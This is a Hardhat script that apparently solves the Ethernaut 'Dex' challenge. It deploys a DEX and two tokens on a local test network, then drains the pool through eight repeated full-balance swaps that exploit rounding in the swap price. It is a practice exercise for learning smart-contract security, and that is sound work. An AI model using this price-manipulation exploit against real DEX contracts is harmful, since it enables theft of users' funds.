const { network, deployments, ethers, getNamedAccounts } = require('hardhat')

async function main() {
    const [owner, addr1, addr2] = await ethers.getSigners()

    const Dex = await ethers.getContractFactory('Dex')
    const dex = await Dex.deploy()
    await dex.deployed()

    const SwappableToken1 = await ethers.getContractFactory('SwappableToken')
    const swappableToken1 = await SwappableToken1.deploy(dex.address, 'Token1', 'T1', 1000)
    await swappableToken1.deployed()

    const SwappableToken2 = await ethers.getContractFactory('SwappableToken')
    const swappableToken2 = await SwappableToken2.deploy(dex.address, 'Token2', 'T2', 1000)
    await swappableToken2.deployed()

    await dex.setTokens(swappableToken1.address, swappableToken2.address)
    await swappableToken1.transfer(dex.address, 100)
    await swappableToken2.transfer(dex.address, 100)
    await swappableToken1.transfer(addr1.address, 10)
    await swappableToken2.transfer(addr1.address, 10)

    const hacker = await dex.connect(addr1)

    // ------------ let's hack -------------
    console.log(`hacker balance Token1 : ${await swappableToken1.balanceOf(addr1.address)} Token2 : ${await swappableToken2.balanceOf(addr1.address)}`)
    await hacker.approve(dex.address, ethers.BigNumber.from(2).pow(256).sub(1))

    await hacker.swap(swappableToken1.address, swappableToken2.address, await swappableToken1.balanceOf(addr1.address))
    console.log(`hacker balance Token1 : ${await swappableToken1.balanceOf(addr1.address)} Token2 : ${await swappableToken2.balanceOf(addr1.address)}`)

    await hacker.swap(swappableToken2.address, swappableToken1.address, await swappableToken2.balanceOf(addr1.address))
    console.log(`hacker balance Token1 : ${await swappableToken1.balanceOf(addr1.address)} Token2 : ${await swappableToken2.balanceOf(addr1.address)}`)

    await hacker.swap(swappableToken1.address, swappableToken2.address, await swappableToken1.balanceOf(addr1.address))
    console.log(`hacker balance Token1 : ${await swappableToken1.balanceOf(addr1.address)} Token2 : ${await swappableToken2.balanceOf(addr1.address)}`)

    await hacker.swap(swappableToken2.address, swappableToken1.address, await swappableToken2.balanceOf(addr1.address))
    console.log(`hacker balance Token1 : ${await swappableToken1.balanceOf(addr1.address)} Token2 : ${await swappableToken2.balanceOf(addr1.address)}`)

    await hacker.swap(swappableToken1.address, swappableToken2.address, await swappableToken1.balanceOf(addr1.address))
    console.log(`hacker balance Token1 : ${await swappableToken1.balanceOf(addr1.address)} Token2 : ${await swappableToken2.balanceOf(addr1.address)}`)

    await hacker.swap(swappableToken2.address, swappableToken1.address, await swappableToken2.balanceOf(addr1.address))
    console.log(`hacker balance Token1 : ${await swappableToken1.balanceOf(addr1.address)} Token2 : ${await swappableToken2.balanceOf(addr1.address)}`)

    await hacker.swap(swappableToken1.address, swappableToken2.address, await swappableToken1.balanceOf(addr1.address))
    console.log(`hacker balance Token1 : ${await swappableToken1.balanceOf(addr1.address)} Token2 : ${await swappableToken2.balanceOf(addr1.address)}`)

    await hacker.swap(swappableToken2.address, swappableToken1.address, await swappableToken2.balanceOf(addr1.address))
    console.log(`hacker balance Token1 : ${await swappableToken1.balanceOf(addr1.address)} Token2 : ${await swappableToken2.balanceOf(addr1.address)}`)
}

// hh run scripts/ethernaut1.js --network hardhat
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
